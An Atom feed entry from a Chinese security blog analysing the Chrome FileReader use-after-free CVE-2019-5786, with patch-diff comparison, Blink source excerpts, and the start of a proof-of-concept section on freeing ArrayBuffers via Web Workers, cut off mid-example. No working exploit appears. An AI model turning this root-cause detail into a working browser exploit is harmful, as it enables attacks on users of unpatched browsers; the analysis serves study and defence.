<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>程序人生</title>
  
  <subtitle>Fuzzing / Vulnerability / Exploit</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://programlife.net/"/>
  <updated>2019-03-26T13:54:09.000Z</updated>
  <id>http://programlife.net/</id>
  
  <author>
    <name>Ke Liu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CVE-2019-5786 Chrome FileReader UAF 漏洞分析</title>
    <link href="http://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/"/>
    <id>http://programlife.net/2019/03/25/cve-2019-5786-chrome-filereader-use-after-free-vulnerability-analysis/</id>
    <published>2019-03-25T10:00:00.000Z</published>
    <updated>2019-03-26T13:54:09.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞简介"><a href="#0x01-漏洞简介" class="headerlink" title="0x01. 漏洞简介"></a>0x01. 漏洞简介</h2><p>准备用业余时间学习一点浏览器漏洞利用相关的知识，刚好最近 Chrome 爆出来一个野外利用漏洞 CVE-2019-5786 ，而且网上也有两篇比较详细的分析报告（来自 <a href="https://blog.exodusintel.com/2019/03/20/cve-2019-5786-analysis-and-exploitation/" target="_blank" rel="noopener">Exodus Intelligence</a> 和 <a href="https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/analysis-of-a-chrome-zero-day-cve-2019-5786/" target="_blank" rel="noopener">McAfee Labs</a>），刚好可以借鉴学习一下漏洞的原理以及利用技巧。</p><p>Chrome 72.0.3626.121 的 <a href="https://chromereleases.googleblog.com/2019/03/stable-channel-update-for-desktop.html" target="_blank" rel="noopener">安全公告</a> 显示，漏洞 CVE-2019-5786 由 Google Threat Analysis Group 的 Clement Lecigne 发现其被利用于野外攻击（配合 Windows 内核空指针漏洞 CVE-2019-0808 可实现 Windows 7 下的提权操作）。</p><a id="more"></a><h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02. 漏洞分析"></a>0x02. 漏洞分析</h2><h3 id="2-1-FileReader"><a href="#2-1-FileReader" class="headerlink" title="2.1 FileReader"></a>2.1 FileReader</h3><p>Chrome 的安全公告指明该 UAF 漏洞位于 <a href="https://developer.mozilla.org/en-US/docs/Web/API/FileReader" target="_blank" rel="noopener">FileReader</a> 中，因此在进行具体的漏洞分析工作之前，有必要简单了解一下 FileReader 对象的用法。FileReader 可以实现对文件内容（<strong>File</strong>）或者缓冲区数据（<strong>Blob</strong>）的异步读取，其中几个重要的属性或者回调函数如下所示。</p><ul><li><code>readyState</code> 表示读取状态<ul><li>EMPTY，0，尚未读取任何数据</li><li>LOADING，1，正在读取数据</li><li>DONE，2，数据读取完成</li></ul></li><li><code>result</code> 表示读取结果，具体的格式与数据的读取方式有关<ul><li>readAsArrayBuffer</li><li>readAsBinaryString</li><li>readAsDataURL</li><li>readAsText</li></ul></li><li><code>onprogress</code> 回调函数<ul><li>读取 <strong>Blob</strong> 时触发</li><li>当数据比较多时可能会周期性触发多次</li></ul></li><li><code>onloadend</code> 回调函数<ul><li>读取操作完成时触发，不管最终读取成功还是失败</li></ul></li></ul><p>下面是 FileReader 的一段简单示例代码（读取长度为 100MB 的字符串到 ArrayBuffer 中）：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">var size = 100 * 1024 * 1024;</span></span><br><span class="line"><span class="undefined">var string = 'A'.repeat(size);</span></span><br><span class="line"><span class="undefined">var blob = new Blob([string]);</span></span><br><span class="line"><span class="undefined">var reader = new FileReader();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">reader.onprogress = function(event) &#123;</span></span><br><span class="line"><span class="undefined">    console.log('current read bytes: ' + event.target.result.byteLength);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">reader.onloadend = function(event) &#123;</span></span><br><span class="line"><span class="undefined">    console.log('read as ArrayBuffer: ' + event.target.result);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">reader.readAsArrayBuffer(blob);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为待读取的内容比较大，因此可以看到 <code>onprogress</code> 回调函数被多次触发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">current read bytes: 69730304</span><br><span class="line">current read bytes: 104660992</span><br><span class="line">current read bytes: 104857600</span><br><span class="line">read as ArrayBuffer: [object ArrayBuffer]</span><br></pre></td></tr></table></figure><h3 id="2-2-漏洞分析"><a href="#2-2-漏洞分析" class="headerlink" title="2.2 漏洞分析"></a>2.2 漏洞分析</h3><h4 id="2-2-1-代码查看"><a href="#2-2-1-代码查看" class="headerlink" title="2.2.1 代码查看"></a>2.2.1 代码查看</h4><p>由于众所周知的原因，在国内下载 Chromium 的源码是非常不方便的，另外如果电脑配置一般的话，在 Visual Studio 中查看和编译代码也是一件非常痛苦的事情，因此笔者推荐使用 Chromium 的在线浏览代码功能，因为支持查找和跳转，使用起来非常方便。查看代码的 URL 格式非常简单，指明文件路径、CL 版本（Change List 版本，即 GIT 提交时创建的 HASH 值）、代码行号即可。</p><blockquote><p><a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137</a></p></blockquote><h4 id="2-2-2-补丁对比"><a href="#2-2-2-补丁对比" class="headerlink" title="2.2.2 补丁对比"></a>2.2.2 补丁对比</h4><p>从 Chrome 的安全公告可知漏洞的内部 ID 为 <a href="https://crbug.com/936448" target="_blank" rel="noopener">936448</a> ，尽管漏洞报告暂时不可访问，但是基于漏洞 ID 可以找到补丁的提交记录 <a href="https://chromium.googlesource.com/chromium/src/+/150407e8d3610ff25a45c7c46877333c4425f062" target="_blank" rel="noopener">150407e</a> （上一版本为 <a href="https://chromium.googlesource.com/chromium/src/+/1675c51b1d83160a8b7061f38bb722b2c43937b4" target="_blank" rel="noopener">1675c51</a> ）。</p><p>补丁之前的代码如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=137" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc:137</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  <span class="keyword">if</span> (finished_loading_) &#123;</span><br><span class="line">    array_buffer_result_ = result;</span><br><span class="line">    AdjustReportedMemoryUsageToV8(</span><br><span class="line">        <span class="number">-1</span> * <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">    raw_data_.reset();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>补丁之后的代码如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc?cl=150407e8d3610ff25a45c7c46877333c4425f062&amp;l=137" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.cc:137</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* FileReaderLoader::ArrayBufferResult() &#123;</span><br><span class="line">  DCHECK_EQ(read_type_, kReadAsArrayBuffer);</span><br><span class="line">  <span class="keyword">if</span> (array_buffer_result_)</span><br><span class="line">    <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">  <span class="comment">// If the loading is not started or an error occurs, return an empty result.</span></span><br><span class="line">  <span class="keyword">if</span> (!raw_data_ || error_code_ != FileErrorCode::kOK)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (!finished_loading_) &#123;</span><br><span class="line">    <span class="keyword">return</span> DOMArrayBuffer::Create(</span><br><span class="line">        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br><span class="line">  &#125;</span><br><span class="line">  array_buffer_result_ = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br><span class="line">  AdjustReportedMemoryUsageToV8(<span class="number">-1</span> *</span><br><span class="line">                                <span class="keyword">static_cast</span>&lt;<span class="keyword">int64_t</span>&gt;(raw_data_-&gt;ByteLength()));</span><br><span class="line">  raw_data_.reset();</span><br><span class="line">  <span class="keyword">return</span> array_buffer_result_;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在补丁之前，下面这行代码可能会被多次调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer* result = DOMArrayBuffer::Create(raw_data_-&gt;ToArrayBuffer());</span><br></pre></td></tr></table></figure><p>在补丁之后，上面的代码仅会被调用一次，取而代之的是下面这行代码可能会被多次调用：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DOMArrayBuffer::Create(</span><br><span class="line">        ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength()));</span><br></pre></td></tr></table></figure><p>所以这里关键的差异点在于 <strong>多次调用</strong> 下面两行代码的差异：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// before patch</span></span><br><span class="line">raw_data_-&gt;ToArrayBuffer()</span><br><span class="line"><span class="comment">// after patch</span></span><br><span class="line">ArrayBuffer::Create(raw_data_-&gt;Data(), raw_data_-&gt;ByteLength())</span><br></pre></td></tr></table></figure><h4 id="2-2-3-漏洞分析"><a href="#2-2-3-漏洞分析" class="headerlink" title="2.2.3 漏洞分析"></a>2.2.3 漏洞分析</h4><p>如无特殊说明，本文所有代码均基于有漏洞的版本（<strong><em>1675c51b1d83160a8b7061f38bb722b2c43937b4</em></strong>）进行分析。</p><ol><li>函数 <code>FileReaderLoader::ArrayBufferResult</code> 中 <code>raw_data_</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/fileapi/file_reader_loader.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=157" target="_blank" rel="noopener">src/third_party/blink/renderer/core/fileapi/file_reader_loader.h:157</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">unique_ptr</span>&lt;ArrayBufferBuilder&gt; raw_data_;</span><br></pre></td></tr></table></figure><ol start="2"><li><code>ArrayBufferBuilder::ToArrayBuffer</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=103" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.cc:103</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBufferBuilder::ToArrayBuffer() &#123;</span><br><span class="line">  <span class="comment">// Fully used. Return m_buffer as-is.</span></span><br><span class="line">  <span class="keyword">if</span> (buffer_-&gt;ByteLength() == bytes_used_)</span><br><span class="line">    <span class="keyword">return</span> buffer_;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> buffer_-&gt;Slice(<span class="number">0</span>, bytes_used_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>先看 <code>buffer_</code> 的类型，后续再深入分析<code>ArrayBufferBuilder::ToArrayBuffer</code> （<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=94" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer_builder.h:94</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> WTF &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WTF_EXPORT</span> <span class="title">ArrayBufferBuilder</span> <span class="title">final</span> &#123;</span></span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">  <span class="keyword">unsigned</span> bytes_used_;</span><br><span class="line">  <span class="keyword">bool</span> variable_capacity_;</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer_;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><code>ArrayBuffer::Slice</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=259" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h:259</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Slice(<span class="keyword">int</span> begin, <span class="keyword">int</span> end) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> SliceImpl(ClampIndex(begin), ClampIndex(end));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::SliceImpl(<span class="keyword">unsigned</span> begin,</span><br><span class="line">                                                  <span class="keyword">unsigned</span> end) <span class="keyword">const</span> &#123;</span><br><span class="line">  <span class="keyword">size_t</span> size = <span class="keyword">static_cast</span>&lt;<span class="keyword">size_t</span>&gt;(begin &lt;= end ? end - begin : <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> ArrayBuffer::Create(<span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span>*&gt;(Data()) + begin, size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li><code>ArrayBuffer::Create</code> 的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=144" target="_blank" rel="noopener">src/third_party/blink/renderer/platform/wtf/typed_arrays/array_buffer.h:144</a>）：</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">scoped_refptr&lt;ArrayBuffer&gt; ArrayBuffer::Create(<span class="keyword">const</span> <span class="keyword">void</span>* source,</span><br><span class="line">                                               <span class="keyword">size_t</span> byte_length) &#123;</span><br><span class="line">  <span class="function">ArrayBufferContents <span class="title">contents</span><span class="params">(byte_length, <span class="number">1</span>, ArrayBufferContents::kNotShared,</span></span></span><br><span class="line"><span class="function"><span class="params">                               ArrayBufferContents::kDontInitialize)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (UNLIKELY(!contents.Data()))</span><br><span class="line">    OOM_CRASH();</span><br><span class="line">  scoped_refptr&lt;ArrayBuffer&gt; buffer = base::AdoptRef(<span class="keyword">new</span> ArrayBuffer(contents));</span><br><span class="line">  <span class="built_in">memcpy</span>(buffer-&gt;Data(), source, byte_length);</span><br><span class="line">  <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在回到第 <strong>2</strong> 步，在函数 <code>ArrayBufferBuilder::ToArrayBuffer</code> 中，如果 <code>buffer_</code> 的空间满了，则直接返回 <code>buffer_</code> 本身，否则调用 <code>ArrayBuffer::Slice</code> 返回一个 <code>ArrayBuffer</code> 副本。</p><p>最后看一下 <code>DOMArrayBuffer::Create</code> 的定义，注意该函数有多个重载，触发漏洞所用的定义如下所示（<a href="https://cs.chromium.org/chromium/src/third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h?cl=1675c51b1d83160a8b7061f38bb722b2c43937b4&amp;l=20" target="_blank" rel="noopener">src/third_party/blink/renderer/core/typed_arrays/dom_array_buffer.h:20</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> blink &#123;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CORE_EXPORT</span> <span class="title">DOMArrayBuffer</span> <span class="title">final</span> :</span> <span class="keyword">public</span> DOMArrayBufferBase &#123;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="keyword">static</span> DOMArrayBuffer* <span class="title">Create</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> MakeGarbageCollected&lt;DOMArrayBuffer&gt;(<span class="built_in">std</span>::move(buffer));</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">DOMArrayBuffer</span><span class="params">(scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer)</span></span></span><br><span class="line">      : DOMArrayBufferBase(std::move(buffer)) &#123;&#125;</span><br><span class="line"> <span class="comment">// ------------------ cut ------------------</span></span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数比较简单，就是基于 <code>WTF::ArrayBuffer</code> 创建 <code>blink::DOMArrayBuffer</code> ，不要被 <code>std::move</code> 所迷惑，这里只是针对函数形参 <code>scoped_refptr&lt;WTF::ArrayBuffer&gt; buffer</code> 进行 <a href="https://en.cppreference.com/w/cpp/utility/move" target="_blank" rel="noopener">move</a> ，不影响形参智能指针所指向的具体对象。</p><p>那么，这里的漏洞到底是如何产生的呢？回到有问题的 <code>FileReaderLoader::ArrayBufferResult</code> 函数，如果在数据读取完毕时刚好触发了 <code>onprogress</code> 回调函数（注意此时尚未触发 <code>onloadend</code> 函数），因为数据已经读取完毕，函数 <code>ArrayBufferBuilder::ToArrayBuffer</code> 直接返回 <code>buffer_</code> ，在此过程中，没副本产生！当回调函数 <code>onloadend</code> 触发时，返回的 <strong>ArrayBuffer</strong> 将会与 <code>onprogress</code> 返回的 <strong>ArrayBuffer</strong> 共享同一 <strong>backing store</strong> （即底层存储数据用的堆块）！当手上有两个这样的 <strong>ArrayBuffer</strong> 时，可以先释放其中一个，那么访问另一个时将导致 <a href="https://programlife.net/tags/Use-After-Free/">UAF</a> 。</p><p>那么，你是否也会怀疑，在数据读取完毕的时候真的会出现先后触发 <code>onprogress</code> 和 <code>onloadend</code> 的情况吗？笔者也有这样的疑问，但是本文前面提供的 <a href="https://programlife.net/tags/FileReader/">FileReader</a> 测试代码的运行结果表明，确实就有这样的情况：最后一次触发 <code>onprogress</code> 回调函数时，读取的数据长度为 <code>104857600</code> ，表明数据已经读取完毕。</p><p>在补丁之后的代码中，如果 <code>finished_loading_</code> 尚未标记，那么总是调用 <code>ArrayBuffer::Create</code> 返回一个 ArrayBuffer 副本，这样就避免了两个 ArrayBuffer 共享同一 <strong>backing store</strong> 的情况的出现。</p><h3 id="2-3-POC-构造"><a href="#2-3-POC-构造" class="headerlink" title="2.3 POC 构造"></a>2.3 POC 构造</h3><h4 id="2-3-1-ArrayBuffer-Neutering"><a href="#2-3-1-ArrayBuffer-Neutering" class="headerlink" title="2.3.1 ArrayBuffer Neutering"></a>2.3.1 ArrayBuffer Neutering</h4><p>在构造 POC 之前，先学习一下怎么释放一个 ArrayBuffer 的 <strong>backing store</strong> 。通常而言，可以通过转移 ArrayBuffer （比如转移给另一个线程）来实现底层堆块的释放，这称之为 <strong>Neuter</strong> 。在 V8 中，ArrayBuffer 提供了 <code>Neuter</code> 方法，代码如下所示（<a href="https://cs.chromium.org/chromium/src/v8/include/v8.h?l=4819" target="_blank" rel="noopener">src/v8/include/v8.h:4819</a>）：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Detaches this ArrayBuffer and all its views (typed arrays).</span></span><br><span class="line"><span class="comment"> * Detaching sets the byte length of the buffer and all typed arrays to zero,</span></span><br><span class="line"><span class="comment"> * preventing JavaScript from ever accessing underlying backing store.</span></span><br><span class="line"><span class="comment"> * ArrayBuffer should have been externalized and must be detachable.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Detach</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TODO(913887): fix the use of 'neuter' in the API.</span></span><br><span class="line">V8_DEPRECATE_SOON(<span class="string">"Use Detach() instead."</span>, <span class="keyword">inline</span> <span class="keyword">void</span> Neuter()) &#123; Detach(); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Make this ArrayBuffer external. The pointer to underlying memory block</span></span><br><span class="line"><span class="comment"> * and byte length are returned as |Contents| structure. After ArrayBuffer</span></span><br><span class="line"><span class="comment"> * had been externalized, it does no longer own the memory block. The caller</span></span><br><span class="line"><span class="comment"> * should take steps to free memory when it is no longer needed.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The Data pointer of ArrayBuffer::Contents must be freed using the provided</span></span><br><span class="line"><span class="comment"> * deleter, which will call ArrayBuffer::Allocator::Free if the buffer</span></span><br><span class="line"><span class="comment"> * was allocated with ArraryBuffer::Allocator::Allocate.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">Contents <span class="title">Externalize</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure><p>可以看到，调用 <code>Neuter</code> 时 ArrayBuffer 已经被 <strong>Externalized</strong> 了，此时 ArrayBuffer 的 <strong>backing store</strong> 已经被调用方所释放了。</p><p><strong>Neuter</strong> 一个 ArrayBuffer 的常规做法是把它转移给一个工作者线程（ <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers" target="_blank" rel="noopener">Web Workers</a> ）。与桌面软件一样，JavaScript 默认的执行线程为 UI 线程，如果要执行复杂的计算工作，应当新建一个工作者线程来执行任务，以防止 UI 失去响应。</p><p>在 JavaScript 中，各线程之间通过 <code>postMessage</code> 实现数据的发送、通过 <code>onmessage</code> 回调函数实现消息的相应。线程之间的数据传递是通过复制（而不是共享）来实现的，因此传递对象时会经历序列化和反序列化的过程，即传出时进行序列化，传入时进行反序列化。大多数浏览器通过 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm" target="_blank" rel="noopener">Structured clone algorithm</a> 来实现这一特性。</p><p>如果要传递的对象实现了 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Transferable" target="_blank" rel="noopener">Transferable</a> 接口，那么可以实现数据的高效转移，即并不复制数据，而是通过直接转移所有权来实现传递。对于这种传递方式，因为直接转移了所有权，因此原有线程不再享有对象数据的访问权限。ArrayBuffer 就是以这样的方式转移的，但这里笔者有一个 <strong>疑问</strong> ：实际情况中，原有 ArrayBuffer 的 <strong>backing store</strong> 会被释放，显然在接收线程中会有新的堆块的分配以及数据的复制，并不是简单的修改指针的指向，这和 MDN 的文档描述的高效理念是冲突的。</p><p>线程相关的两个重要概念定义如下：</p><ul><li><p><code>postMessage</code> 发送消息</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(message, [transfer]);</span><br></pre></td></tr></table></figure><ul><li>message 表示要传递的数据</li><li>如果有实现了 <code>Transferable</code> 的对象，可以以数组元素的方式放到第二个参数中，以提高传递效率，但是在第一个参数中需要指定一个引用，以方便目标线程接收</li></ul></li><li><p><code>onmessage</code> 响应消息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">myWorker.onmessage = function(e) &#123; ... &#125;</span><br></pre></td></tr></table></figure><ul><li>通过事件的 <code>data</code> 属性访问接收到的数据</li></ul></li></ul><p>一个简单的例子如下所示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- main.html 的代码 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> worker = <span class="keyword">new</span> Worker(<span class="string">'worker.js'</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">'Main thread: before postMessage, ab.byteLength is '</span> + ab.byteLength);</span></span><br><span class="line"><span class="undefined">worker.postMessage(ab, [ab]);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(<span class="string">'Main thread: after postMessage, ab.byteLength is '</span> + ab.byteLength);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span 